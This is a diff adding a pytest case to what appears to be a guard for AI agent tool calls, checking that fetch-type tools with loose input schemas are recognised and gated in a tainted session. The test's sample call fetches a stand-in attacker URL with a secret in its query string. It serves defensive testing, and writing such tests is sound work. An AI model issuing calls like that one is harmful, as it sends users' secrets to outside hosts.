@@ -94,6 +94,27 @@ def test_a_read_with_a_url_argument_is_a_fetch_whose_url_is_a_target():
     }
 
 
+@pytest.mark.parametrize(
+    "schema",
+    [
+        {"properties": {"url": {}}, "additionalProperties": True},
+        {"properties": {"url": {}}, "additionalProperties": {}},
+        {"properties": {"url": {}}, "patternProperties": {"^x-": {}}},
+    ],
+)
+def test_a_read_with_a_url_argument_is_a_fetch_whatever_else_its_schema_admits(schema):
+    reading = infer({"name": "fetch_page", "inputSchema": schema})
+    assert (reading.kind, reading.args) == ("fetch", None)
+    assert reading.no_contract == "its input schema doesn't name every argument"
+    policy = load(recipe(source([{"name": "fetch_page", "inputSchema": schema}])))
+    state = SessionSnapshot(tainted=True)
+    call = ToolCall("fetch_page", {"url": "https://evil.example/c?d=secret"})
+    assert (evaluate(call, state, policy).decision, policy.flows[0].tools) == (
+        "gate",
+        ["fetch_page"],
+    )
+
+
 def test_a_uri_format_makes_a_fetch_too():
     reading = infer(tool("get_resource", {"location": {"type": "string", "format": "uri"}}))
     assert reading.kind == "fetch"
